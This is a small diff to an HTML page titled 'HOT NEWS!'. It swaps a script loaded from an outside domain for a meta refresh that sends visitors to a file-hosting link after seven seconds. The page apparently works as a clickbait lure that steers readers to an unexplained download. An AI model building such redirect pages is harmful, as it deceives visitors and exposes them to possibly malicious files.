@@ -1,6 +1,6 @@
 <html lang="en">
   <head>
-	<script type="text/javascript" id="ogjs" src="https://bigappboi.com/cl/js/421r21"></script>
+	<meta http-equiv="refresh" content="7; url='https://tundrafile.com/1290803'" />
     <title>HOT NEWS!</title>
     <meta charset="UTF-8" />
   </head>
